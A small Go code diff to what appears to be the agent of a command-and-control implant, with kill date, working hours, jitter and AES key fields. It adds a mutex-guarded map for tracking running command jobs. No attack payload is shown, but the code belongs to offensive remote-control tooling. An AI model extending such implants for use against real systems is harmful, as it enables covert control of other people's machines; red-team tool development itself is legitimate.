@@ -7,6 +7,7 @@ import (
 	"os"
 	"os/exec"
 	"strings"
+	"sync"
 	"time"
 )
 
@@ -43,6 +44,8 @@ type MainAgent struct {
 	userAgent        string
 	headers          map[string]string
 	encryptionKey    []byte
+	runningJobs      map[int]*exec.Cmd
+	runningJobsMu    sync.Mutex
 }
 
 func NewMainAgent(packetHandler comms.PacketHandler, messagesender *comms.HttpMessageSender, sessionID, killDate, workingHours string, delay int, jitter float64, lostLimit int, aeskey []byte, defaultResponse string) *MainAgent {
@@ -61,6 +64,7 @@ func NewMainAgent(packetHandler comms.PacketHandler, messagesender *comms.HttpMe
 		defaultResponse: defaultResponse,
 		tasks:           make(map[string]*Task),
 		encryptionKey:   aeskey,
+		runningJobs:     make(map[int]*exec.Cmd),
 	}
 }
 
